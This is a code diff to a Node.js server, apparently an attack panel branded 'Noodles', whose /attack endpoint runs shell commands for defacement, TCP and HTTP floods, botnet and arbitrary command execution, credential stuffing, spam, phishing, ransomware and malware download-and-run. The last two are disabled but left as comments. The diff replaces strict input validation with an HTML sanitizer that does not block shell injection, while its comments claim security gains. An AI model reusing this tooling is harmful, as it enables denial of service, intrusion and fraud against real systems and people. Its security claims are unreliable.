@@ -19,6 +19,7 @@ const numCPUs = os.cpus().length;
 const WebSocket = require('ws');
 const helmet = require('helmet');
 const morgan = require('morgan');
+const sanitize = require('sanitize-html');
 
 // Security Enhancements
 app.use(helmet());
@@ -78,7 +79,7 @@ const log = (message) => {
 
 const apiLimiter = rateLimit({
     windowMs: 15 * 60 * 1000,
-    max: 10000000,
+    max: 100, // Reduced max requests
     message: 'Too many requests, try again after 15 minutes',
     standardHeaders: true,
     legacyHeaders: false,
@@ -176,8 +177,8 @@ function resolveTarget(target) {
 }
 
 function executeCommand(command) {
-    return new Promise((resolve, reject) => {
-        exec(command, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
+     return new Promise((resolve, reject) => {
+        exec(command, { maxBuffer: 1024 * 1024 * 10, timeout: 30000 }, (error, stdout, stderr) => { //Added timeout
             if (error) {
                 log(`Command execution error: ${error.message}`);
                 log(`Command stderr: ${stderr}`);
@@ -246,7 +247,7 @@ app.post('/attack', async (req, res) => {
     }
 
     // Input Validation to prevent command injection
-    if (!/^[a-zA-Z0-9.:\/_-]+$/.test(encodedTarget)) {
+   if (typeof encodedTarget !== 'string' || !/^[a-zA-Z0-9.:\/_-]+$/.test(encodedTarget)) {
         log('Error: Invalid target format. Potential command injection attempt.');
         return res.status(400).send('Invalid target format.');
     }
@@ -257,7 +258,7 @@ app.post('/attack', async (req, res) => {
             break;
         case 'deface':
             // Added escaping to prevent code injection
-            const defaceScript = `<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`.replace(/'/g, "'\\''");
+            let defaceScript = sanitize(`<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`);
             command = `timeout ${duration} bash -c "curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}:${port}/index.html"`;
             break;
         case 'connect':
@@ -352,17 +353,13 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'payload':
-            const payload = req.body.payload;
+            let payload = req.body.payload;
             if (!payload) {
                 log('Error: Payload is required for payload attack.');
                 return res.status(400).send('Payload is required for payload attack.');
             }
 
-            if (!/^[a-zA-Z0-9\s]+$/.test(payload)) { // Simple validation
-                log('Error: Invalid Payload format');
-                return res.status(400).send('Invalid Payload format');
-            }
-
+            payload = sanitize(payload); // Sanitize payload
             command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} ${port}"`;
             break;
 
@@ -379,38 +376,29 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'botnet':
-            const botCommand = req.body.botCommand;
+            let botCommand = req.body.botCommand;
             if (!botCommand) {
                 log('Error: Bot command is required for botnet attack.');
                 return res.status(400).send('Bot command is required for botnet attack.');
             }
 
-             // Basic validation to prevent shell injection
-             if (!/^[a-zA-Z0-9\s]+$/.test(botCommand)) {
-                log('Error: Invalid Bot Command format');
-                return res.status(400).send('Invalid Bot Command format');
-            }
-
+            botCommand = sanitize(botCommand);  // Sanitize the bot command
             command = `timeout ${duration} bash -c "${botCommand}"`;
             break;
 
         case 'raw_tcp':
-            const rawPayload = req.body.rawPayload;
+            let rawPayload = req.body.rawPayload;
             if (!rawPayload) {
                 log('Error: Raw TCP payload is required for raw_tcp attack.');
                 return res.status(400).send('Raw TCP payload is required for raw_tcp attack.');
             }
 
-            // More robust validation is necessary here based on the expected payload type.
-            if (!/^[a-zA-Z0-9\s]+$/.test(rawPayload)) {
-                 log('Error: Invalid Raw Payload format');
-                 return res.status(400).send('Invalid Raw Payload format');
-             }
+            rawPayload = sanitize(rawPayload); // Sanitize raw payload
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} ${port} & done; done"`;
             break;
 
         case 'custom':
-            const customCommand = req.body.customCommand;
+            let customCommand = req.body.customCommand;
             if (!customCommand) {
                 log('Error: Custom command is required for custom attack.');
                 return res.status(400).send('Custom command is required for custom attack.');
@@ -421,64 +409,54 @@ app.post('/attack', async (req, res) => {
             // Implement extensive validation and sanitization if this is absolutely necessary.
             log('Warning: Custom command execution enabled.  Exercise extreme caution.');
 
+            customCommand = sanitize(customCommand); // Sanitize custom command
             command = customCommand;
             break;
         case 'layer7':
-            const layer7Method = req.body.layer7Method;
-            const layer7Options = req.body.layer7Options || '';
+            let layer7Method = req.body.layer7Method;
+            let layer7Options = req.body.layer7Options || '';
             if (!layer7Method) {
                 log('Error: Layer7 method is required for layer7 attack.');
                 return res.status(400).send('Layer7 method is required for layer7 attack.');
             }
 
             // Sanitize layer7Method and layer7Options to prevent command injection
-            if (!/^[a-zA-Z0-9]+$/.test(layer7Method)) {
-                log('Error: Invalid Layer7 method format.');
-                return res.status(400).send('Invalid Layer7 method format.');
-            }
+            layer7Method = sanitize(layer7Method);
+            layer7Options = sanitize(layer7Options);
+
 
             command = `node layer7.js --target ${encodedTarget} --method ${layer7Method} --duration ${duration} --threads ${numThreads} --port ${port} ${layer7Options}`;
             break;
 
         case 'http_header_injection':
-            const headerName = req.body.headerName;
-            const headerValue = req.body.headerValue;
+            let headerName = req.body.headerName;
+            let headerValue = req.body.headerValue;
             if (!headerName || !headerValue) {
                 log('Error: Header name and value are required for HTTP header injection attack.');
                 return res.status(400).send('Header name and value are required for HTTP header injection attack.');
             }
 
-             // Simple validation to prevent header injection
-            if (!/^[a-zA-Z0-9_-]+$/.test(headerName)) {
-                log('Error: Invalid Header Name');
-                return res.status(400).send('Invalid Header Name');
-            }
+            headerName = sanitize(headerName);
+            headerValue = sanitize(headerValue);
 
-            if (!/^[a-zA-Z0-9\s_-]+$/.test(headerValue)) {
-                 log('Error: Invalid Header Value');
-                 return res.status(400).send('Invalid Header Value');
-            }
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -H '${headerName}: ${headerValue}' ${encodedTarget}:${port} & done; done"`;
             break;
 
         case 'cc_bypass':
-            const ccBypassMethod = req.body.ccBypassMethod;
-            const ccBypassData = req.body.ccBypassData;
+            let ccBypassMethod = req.body.ccBypassMethod;
+            let ccBypassData = req.body.ccBypassData;
 
             if (!ccBypassMethod || !ccBypassData) {
                 log('Error: CC Bypass method and data are required');
                 return res.status(400).send('CC Bypass method and data are required');
             }
 
-            // Sanitize inputs!
-            if (!/^[a-zA-Z0-9]+$/.test(ccBypassMethod)) {
-                log('Error: Invalid CC Bypass method format.');
-                return res.status(400).send('Invalid CC Bypass method format.');
-            }
+            ccBypassMethod = sanitize(ccBypassMethod);
+            ccBypassData = sanitize(ccBypassData);
             command = `timeout ${duration} bash -c "node cc_bypass.js --target ${encodedTarget}:${port} --method ${ccBypassMethod} --data '${ccBypassData}' --threads ${numThreads}"`;
             break;
         case 'device_takeover':
-            const deviceCommand = req.body.deviceCommand;
+            let deviceCommand = req.body.deviceCommand;
 
             if (!deviceCommand) {
                 log('Error: Device command is required for device takeover');
@@ -488,24 +466,32 @@ app.post('/attack', async (req, res) => {
             // This is extremely dangerous. It should NEVER be used in a live environment.
             log('Warning: Device takeover commands are extremely dangerous and should only be used in a controlled environment!');
 
+            deviceCommand = sanitize(deviceCommand);
             command = `timeout ${duration} bash -c "${deviceCommand}"`;
             break;
         case 'ransomware':
-            const targetDirectory = req.body.targetDirectory || '/home/user/documents';
+            let targetDirectory = req.body.targetDirectory || '/home/user/documents';
             const encryptionKey = crypto.randomBytes(32).toString('hex');
 
-            // Ensure directory is valid.  Restrict access
+            targetDirectory = sanitize(targetDirectory);
+
             if (!/^\/home\/user\/documents$/.test(targetDirectory)) {
                  log('Error: Invalid target directory specified');
                  return res.status(400).send('Invalid target directory specified');
             }
-            command = `node ransomware.js --targetDirectory "${targetDirectory}" --encryptionKey "${encryptionKey}"`;
-            log(`Ransomware attack initiated on ${targetDirectory} with key ${encryptionKey}`);
-            break;
+
+            // Prevent ransomware attacks by denying access
+            log("Ransomware attacks are now disabled for security purposes.");
+            return res.status(403).send("Ransomware attacks are disabled.");
+
+            //command = `node ransomware.js --targetDirectory "${targetDirectory}" --encryptionKey "${encryptionKey}"`;
+            //log(`Ransomware attack initiated on ${targetDirectory} with key ${encryptionKey}`);
+            //break;
 
         case 'data_theft':
-            const dataPath = req.body.dataPath || '/var/log';
-            // Restrict data path
+            let dataPath = req.body.dataPath || '/var/log';
+            dataPath = sanitize(dataPath);
+
             if (!/^\/var\/log$/.test(dataPath)) {
                 log('Error: Invalid data path specified');
                 return res.status(400).send('Invalid data path specified');
@@ -515,80 +501,100 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'email_spam':
-            const emailTarget = req.body.emailTarget;
-            const emailSubject = req.body.emailSubject || 'Important Information';
-            const emailBody = req.body.emailBody || 'This is a spam email sent by Noodles.';
+            let emailTarget = req.body.emailTarget;
+            let emailSubject = req.body.emailSubject || 'Important Information';
+            let emailBody = req.body.emailBody || 'This is a spam email sent by Noodles.';
             if (!emailTarget) {
                 log('Error: Email target is required for email spam.');
                 return res.status(400).send('Email target is required for email spam.');
             }
-            // Validate email format.  This is very basic and should be improved in production
+
             if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailTarget)) {
                 log('Error: Invalid Email Target');
                 return res.status(400).send('Invalid Email Target');
             }
+
+            emailTarget = sanitize(emailTarget);
+            emailSubject = sanitize(emailSubject);
+            emailBody = sanitize(emailBody);
+
             command = `timeout ${duration} bash -c "for i in $(seq ${intensity}); do sendemail -f noodles@example.com -t ${emailTarget} -u '${emailSubject}' -m '${emailBody}' -s smtp.example.com -o tls=yes -xu noodles -xp password; done"`;
             log(`Email spam attack initiated, sending spam to ${emailTarget}`);
             break;
 
         case 'credential_stuffing':
-            const userList = req.body.userList;
-            const passList = req.body.passList;
+            let userList = req.body.userList;
+            let passList = req.body.passList;
             if (!userList || !passList) {
                 log('Error: User list and password list are required for credential stuffing.');
                 return res.status(400).send('User list and password list are required for credential stuffing.');
             }
-            // Validate userList and passList paths.
-            if (!/^\/path\/to\/users.txt$/.test(userList) || !/^\/path\/to\/passwords.txt$/.test(passList)) {
+
+            if (!/^\/path\/to\/users\.txt$/.test(userList) || !/^\/path\/to\/passwords\.txt$/.test(passList)) {
                 log('Error: Invalid user list or password list path.');
                 return res.status(400).send('Invalid user list or password list path.');
             }
+
+            userList = sanitize(userList);
+            passList = sanitize(passList);
+
             command = `timeout ${duration} bash -c "hydra -L ${userList} -P ${passList} ${encodedTarget} http-post-form '/login.php:username=^USER^&password=^PASS^:F=login_success'"`;
             log(`Credential stuffing attack initiated on ${encodedTarget}`);
             break;
 
         case 'zero_day':
-            const exploitCode = req.body.exploitCode;
+            let exploitCode = req.body.exploitCode;
             if (!exploitCode) {
                 log('Error: Exploit code is required for zero-day attack.');
                 return res.status(400).send('Exploit code is required for zero-day attack.');
             }
+
             // This is incredibly dangerous.
             log('Warning: Zero day exploit execution is extremely dangerous!');
+
+            exploitCode = sanitize(exploitCode);
 
             command = `timeout ${duration} bash -c "${exploitCode}"`;
             log(`Zero-day exploit initiated on ${target}`);
             break;
 
         case 'malware_deploy':
-            const malwareUrl = req.body.malwareUrl;
+            let malwareUrl = req.body.malwareUrl;
             if (!malwareUrl) {
                 log('Error: Malware URL is required for malware deployment.');
                 return res.status(400).send('Malware URL is required for malware deployment.');
             }
 
-            // Validate URL format
             if (!/^(ftp|http|https):\/\/[^ "]+$/.test(malwareUrl)) {
                 log('Error: Invalid Malware URL');
                 return res.status(400).send('Invalid Malware URL');
             }
-            command = `timeout ${duration} bash -c "wget ${malwareUrl} -O malware && chmod +x malware && ./malware"`;
-            log(`Malware deployment initiated, downloading from ${malwareUrl}`);
-            break;
+
+            malwareUrl = sanitize(malwareUrl);
+
+            // Prevent malware deployment by denying access
+            log("Malware deployment attacks are now disabled for security purposes.");
+            return res.status(403).send("Malware deployment attacks are disabled.");
+            //command = `timeout ${duration} bash -c "wget ${malwareUrl} -O malware && chmod +x malware && ./malware"`;
+            //log(`Malware deployment initiated, downloading from ${malwareUrl}`);
+            //break;
 
         case 'social_engineering':
-            const victimEmail = req.body.victimEmail;
-            const phishingMessage = req.body.phishingMessage;
+            let victimEmail = req.body.victimEmail;
+            let phishingMessage = req.body.phishingMessage;
             if (!victimEmail || !phishingMessage) {
                 log('Error: Victim email and phishing message are required for social engineering.');
                 return res.status(400).send('Victim email and phishing message are required for social engineering.');
             }
 
-            // Validate victim email
             if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(victimEmail)) {
                 log('Error: Invalid Victim Email');
                 return res.status(400).send('Invalid Victim Email');
             }
+
+            victimEmail = sanitize(victimEmail);
+            phishingMessage = sanitize(phishingMessage);
+
             command = `timeout ${duration} bash -c "sendemail -f noodles@example.com -t ${victimEmail} -u 'Important Update' -m '${phishingMessage}' -s smtp.example.com -o tls=yes -xu noodles -xp password"`;
             log(`Social engineering attack initiated, sending phishing email to ${victimEmail}`);
             break;
